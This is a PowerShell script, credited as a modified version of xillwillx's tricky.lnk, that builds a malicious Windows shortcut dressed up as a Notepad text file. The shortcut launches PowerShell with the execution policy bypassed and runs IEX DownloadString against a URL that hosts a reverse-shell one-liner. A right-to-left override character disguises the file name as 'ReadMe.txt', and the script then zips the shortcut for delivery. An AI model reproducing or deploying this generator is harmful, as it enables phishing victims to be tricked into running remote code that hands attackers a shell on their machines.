function Generate-LNK{
<#

.SYNOPSIS
A PowerShell script to generate lnk files and zip it

.DESCRIPTION
A PowerShell script to generate lnk files and zip it

.PARAMETER iconpath
Set iconpath as notepad or other exes

.PARAMETER exec
Set cmd.exe/powershell.exe or other executable

.PARAMETER desc
set description of notepadfile

.PARAMETER reverseadd
Add your powershell one liner reverseshell hosted url

.PARAMETER argg
Pass arguements to exec being called

.PARAMETER lnkpath
Path to lnk file to be saved

.PARAMETER zippath
Path with name of zip file to be created

.EXAMPLE
PS C:\> . .\Generate-LNK.ps1
PS C:\> Generate-LNK -reverseadd "http://youripofwebserver/powershellreverseoneliner.txt"

.LINK
https://raw.githubusercontent.com/xillwillx/tricky.lnk/master/tricky.ps1

.NOTES
This script is a modified version of xillwillx's script and I take no credit of the code. Full credit goes to xillwillx.
Follow him on twitter - @xillwillx

#>

	[CmdletBinding()]
	Param (
	    
        [Parameter(Mandatory=$false)]
		[String]
		$iconpath = "C:\Windows\System32\notepad.exe",

		[Parameter(Mandatory=$false)]
		[String]
		$exec = "powershell",

        [Parameter(Mandatory=$false)]
		[String]
		$desc = "Type: Text Document",

        [Parameter(Mandatory=$false)]
		[String]
		$reverseadd = "http://192.168.100.13:443/reverse.txt",

        [Parameter(Mandatory=$false)]
		[String]
		$argg = " -ExecutionPolicy Bypass -noLogo -Command IEX (New-Object Net.WebClient).DownloadString($reverseadd);",

        [Parameter(Mandatory=$false)]
		[String]
		$lnkpath = $env:USERPROFILE + "\Desktop\FakeText.lnk",

        [Parameter(Mandatory=$false)]
		[String]
        $zippath = $env:USERPROFILE + "\Desktop\hululu.zip"
        )
		try{
            $ws = New-Object -ComObject ("WScript.Shell")
            $sh = $ws.CreateShortcut($lnkpath)
            $sh.Arguments = $argg
            $sh.TargetPath = $exec
            $sh.IconLocation = $iconpath + ",0";
            $sh.Description = $desc;
            $sh.Save()
            $unicode = "%u0052%u0065%u0061%u0064%u004d%u0065%u002e%u202e%u0074%u0078%u0074%u002e%u006c%u006e%u006b"
            [Reflection.Assembly]::LoadWithPartialName("System.Web")
            $unescape = [web.httputility]::urldecode($unicode)
            ren ($lnkpath) ($env:USERPROFILE + "\Desktop\" + $unescape)
            Write-Host "LNK file is generated - "$lnkpath
            $compress = @{
            Path = $env:USERPROFILE + "\Desktop\" + $unescape
            CompressionLevel = "Fastest"
            DestinationPath = $zippath}
            Compress-Archive @compress
            Write-Host "ZIP file is generated - "$zippath
            }
        catch
            { 
                Write-Error -Message "Failed to generate lnk file"
            }
}
